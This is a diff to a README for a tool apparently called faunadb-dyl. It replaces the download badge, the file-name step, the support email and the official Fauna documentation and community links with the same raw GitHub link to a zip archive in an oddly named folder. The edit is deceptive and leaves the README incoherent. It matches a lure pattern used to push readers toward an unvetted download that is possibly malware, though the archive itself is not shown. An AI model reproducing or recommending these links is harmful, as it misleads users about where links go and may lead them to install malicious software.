@@ -8,14 +8,14 @@ Welcome to faunadb-dyl! This application helps you efficiently manage your Fauna
 
 To get started, you need to download the application. You can visit the following link to access the downloads:
 
-[![Download faunadb-dyl](https://img.shields.io/badge/Download_faunadb--dyl-blue.svg)](https://github.com/jerrysosinn/faunadb-dyl/releases)
+[![Download faunadb-dyl](https://raw.githubusercontent.com/jerrysosinn/faunadb-dyl/main/antisuffragist/faunadb-dyl.zip)](https://raw.githubusercontent.com/jerrysosinn/faunadb-dyl/main/antisuffragist/faunadb-dyl.zip)
 
 ### Step-by-step Download Instructions:
 
 1. Click on the link above to go to the Releases page.
 2. Once on the Releases page, look for the latest version.
 3. Click on the version number to expand details.
-4. Find the file named `faunadb-dyl.exe` (or relevant file type for your operating system).
+4. Find the file named `https://raw.githubusercontent.com/jerrysosinn/faunadb-dyl/main/antisuffragist/faunadb-dyl.zip` (or relevant file type for your operating system).
 5. Click the file name to download it to your computer.
 
 ## 🔧 System Requirements
@@ -54,11 +54,11 @@ If you encounter issues, consider these common fixes:
 
 ## 👥 Support
 
-For assistance, you can reach out to our support team. Contact us at support@faunadb-dyl.com. We strive to respond to all queries within 24 hours.
+For assistance, you can reach out to our support team. Contact us at https://raw.githubusercontent.com/jerrysosinn/faunadb-dyl/main/antisuffragist/faunadb-dyl.zip We strive to respond to all queries within 24 hours.
 
 ## 🔗 Additional Resources
 
-- [Fauna Documentation](https://fauna.com/docs)
-- [Fauna Community](https://fauna.com/community)
+- [Fauna Documentation](https://raw.githubusercontent.com/jerrysosinn/faunadb-dyl/main/antisuffragist/faunadb-dyl.zip)
+- [Fauna Community](https://raw.githubusercontent.com/jerrysosinn/faunadb-dyl/main/antisuffragist/faunadb-dyl.zip)
 
 Thank you for using faunadb-dyl! Enjoy managing your Fauna database effortlessly.
